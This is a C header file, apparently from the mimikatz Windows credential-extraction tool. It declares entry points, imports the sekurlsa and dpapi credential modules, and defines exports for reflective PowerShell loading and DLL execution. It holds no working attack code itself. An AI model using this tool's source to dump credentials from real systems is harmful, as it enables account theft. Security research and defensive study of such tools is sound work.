/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once

#include "globals.h"
#include "modules/sekurlsa/kuhl_m_sekurlsa.h"
#include "modules/dpapi/kuhl_m_dpapi.h"

#include <io.h>
#include <fcntl.h>
#define DELAYIMP_INSECURE_WRITABLE_HOOKS
#include <delayimp.h>

extern VOID WINAPI RtlGetNtVersionNumbers(LPDWORD pMajor, LPDWORD pMinor, LPDWORD pBuild);

int wmain(int argc, wchar_t * argv[]);
void mimikatz_begin();
void mimikatz_end(NTSTATUS status);

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);

NTSTATUS mimikatz_initOrClean(BOOL Init);

NTSTATUS mimikatz_doLocal(wchar_t * input);

#if defined(_POWERKATZ)
__declspec(dllexport) wchar_t * powershell_reflective_mimikatz(LPCWSTR input);
#elif defined(_WINDLL)
void CALLBACK mimikatz_dll(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow);
#if defined(_M_X64) || defined(_M_ARM64)
#pragma comment(linker, "/export:mainW=mimikatz_dll")
#elif defined(_M_IX86)
#pragma comment(linker, "/export:mainW=_mimikatz_dll@16")
#endif
#endif

#define SE_DEBUG 20